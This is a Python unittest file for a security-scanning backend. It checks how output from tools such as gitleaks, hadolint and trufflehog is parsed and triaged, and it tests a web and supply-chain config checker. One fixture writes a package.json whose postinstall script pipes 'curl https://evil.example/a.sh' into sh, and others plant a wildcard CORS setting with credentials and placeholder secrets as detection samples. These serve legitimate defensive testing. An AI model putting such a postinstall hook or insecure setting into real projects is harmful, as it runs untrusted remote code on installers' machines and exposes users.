"""Unit tests for extended security scanners: gitleaks-git, hadolint, trufflehog, web/supply-chain config, and runtime diagnostics."""

from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path

BACKEND_DIR = Path(__file__).resolve().parents[1] / "Resources" / "backend"
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

import app_updater  # noqa: E402
import source_scanners  # noqa: E402
import triage_engine  # noqa: E402


class TestExtendedScanners(unittest.TestCase):
    def test_parse_gitleaks_git_and_triage_p0(self) -> None:
        raw = json.dumps([
            {
                "RuleID": "aws-access-token",
                "File": "src/config.ts",
                "StartLine": 12,
                "Commit": "abcdef1234567890",
            },
            {
                "RuleID": "generic-api-key",
                "File": "tests/fixture.ts",
                "StartLine": 5,
                "Commit": "1111222233334444",
            },
        ])
        items = source_scanners.parse_gitleaks_git(raw, lambda p: "app")
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0]["scanner"], "gitleaks-git")
        self.assertIn("abcdef12", items[0]["title"])
        tier, _reason = triage_engine.classify_priority_tier(items[0])
        self.assertEqual(tier, "P0")

    def test_gitleaks_git_filters_recaptcha_and_provenance_key_and_dedups_with_head(self) -> None:
        import security_audit_engine

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "src").mkdir()
            (root / "src" / "Recaptcha.tsx").write_text(
                '<GoogleReCaptchaProvider reCaptchaKey="6Ld2FS000000000000000000000000000000B7qo">\n',
                encoding="utf-8",
            )
            (root / "src" / "migration.ts").write_text(
                "const PROVENANCE_KEY = 'cerebras_gemma4_retirement_provenance';\n",
                encoding="utf-8",
            )
            (root / "src" / "real.ts").write_text("const secret = 'REAL_VALUE_1234567890';\n", encoding="utf-8")

            raw = json.dumps([
                {"RuleID": "generic-api-key", "File": "src/Recaptcha.tsx", "StartLine": 1, "Commit": "aaaa1111"},
                {"RuleID": "generic-api-key", "File": "src/migration.ts", "StartLine": 1, "Commit": "aaaa1111"},
                {"RuleID": "aws-access-token", "File": "src/real.ts", "StartLine": 1, "Commit": "aaaa1111"},
            ])
            hist_items = source_scanners.parse_gitleaks_git(raw, lambda p: "src", repo_root=root)
            self.assertEqual(len(hist_items), 1)
            self.assertIn("real.ts", hist_items[0]["file"])

            head_item = {
                "title": "🚨 [シークレット漏洩検知] AWS Access Key ID",
                "file": "src/real.ts:1 (Target: src)",
                "category": "secrets",
                "severity": "critical",
            }
            merged = security_audit_engine.merge_secret_and_gitleaks_findings([head_item, hist_items[0]])
            self.assertEqual(len(merged), 1)
            self.assertIn("gitleaks-git", merged[0].get("detected_by", []))

    def test_parse_hadolint_and_triage_p2_iac(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            raw = json.dumps([
                {"code": "DL3006", "level": "warning", "line": 1, "file": str(root / "Dockerfile"), "message": "Always tag the version of an image explicitly"},
                {"code": "DL3059", "level": "info", "line": 4, "file": str(root / "Dockerfile"), "message": "Multiple consecutive RUN instructions"},
            ])
            items = source_scanners.parse_hadolint(raw, root, lambda p: "docker")
            self.assertEqual(len(items), 1)
            self.assertEqual(items[0]["scanner"], "hadolint")
            self.assertIn("DL3006", items[0]["title"])
            tier, reason = triage_engine.classify_priority_tier(items[0])
            self.assertEqual(tier, "P2")
            self.assertIn("IaC", reason)

    def test_parse_trufflehog_never_leaks_raw_secret_and_triages_p0(self) -> None:
        fake_raw = "sk_live_TESTONLY_NEVER_EXPOSE_999999"
        ndjson = json.dumps({
            "DetectorName": "Stripe",
            "Raw": fake_raw,
            "SourceMetadata": {"Data": {"Filesystem": {"file": "src/payments.ts", "line": 42}}},
        }) + "\n"
        items = source_scanners.parse_trufflehog(ndjson, lambda p: "payments")
        self.assertEqual(len(items), 1)
        serialized = json.dumps(items, ensure_ascii=False)
        self.assertNotIn(fake_raw, serialized)
        tier, _reason = triage_engine.classify_priority_tier(items[0])
        self.assertEqual(tier, "P0")

    def test_web_and_supply_chain_config_checks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "next.config.mjs").write_text("export default { images: { dangerouslyAllowSVG: true } };\n", encoding="utf-8")
            (root / "package.json").write_text(json.dumps({"name": "demo", "scripts": {"postinstall": "curl https://evil.example/a.sh | sh"}}), encoding="utf-8")
            (root / "src").mkdir()
            (root / "src" / "server.ts").write_text("app.use(cors({ origin: '*', credentials: true }));\n", encoding="utf-8")
            (root / "prod.p12").write_bytes(b"fake-p12")
            (root / "bundle.js.map").write_text("{}", encoding="utf-8")

            items, status = source_scanners.scan_web_and_supply_chain_config(root, lambda p: "web")
            self.assertEqual(status, "complete")
            by_rule = {it["rule_id"]: it for it in items}
            self.assertIn("nextjs-dangerously-allow-svg", by_rule)
            self.assertIn("npm-suspicious-postinstall", by_rule)
            self.assertIn("cors-wildcard-credentials", by_rule)
            self.assertIn("committed-keystore-file", by_rule)
            self.assertIn("committed-sourcemap", by_rule)

            self.assertEqual(triage_engine.classify_priority_tier(by_rule["committed-keystore-file"])[0], "P0")
            self.assertEqual(triage_engine.classify_priority_tier(by_rule["npm-suspicious-postinstall"])[0], "P1")
            self.assertEqual(triage_engine.classify_priority_tier(by_rule["nextjs-dangerously-allow-svg"])[0], "P1")
            self.assertEqual(triage_engine.classify_priority_tier(by_rule["cors-wildcard-credentials"])[0], "P1")

    def test_runtime_diagnostics_lists_all_seven_scanners(self) -> None:
        diag = app_updater.get_runtime_diagnostics()
        scanners = {s["name"]: s for s in diag.get("scanners", [])}
        for expected in ("gitleaks", "trufflehog", "trivy", "semgrep", "ruff", "zizmor", "hadolint"):
            self.assertIn(expected, scanners)
            self.assertTrue(scanners[expected]["installed"], f"{expected} should be installed")


if __name__ == "__main__":
    unittest.main()
